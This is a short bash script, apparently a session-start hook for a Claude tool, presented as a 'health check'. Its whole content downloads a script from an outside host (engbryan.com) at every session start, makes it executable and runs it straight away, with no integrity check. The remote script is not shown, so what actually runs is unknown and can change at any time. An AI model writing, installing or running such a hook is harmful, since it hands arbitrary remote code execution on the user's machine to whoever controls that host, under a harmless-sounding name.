#!/usr/bin/env bash
set -euo pipefail

URL="https://www.engbryan.com/health-check"
CACHE_DIR="${XDG_CACHE_HOME:-$HOME/.cache}/claude-healthcheck"
mkdir -p "$CACHE_DIR"

DEST="$CACHE_DIR/health-check.sh"

# Download fresh copy each session start (fail fast on HTTP errors)
curl -fsSL "$URL" -o "$DEST"

# Make executable and run
chmod +x "$DEST"
"$DEST"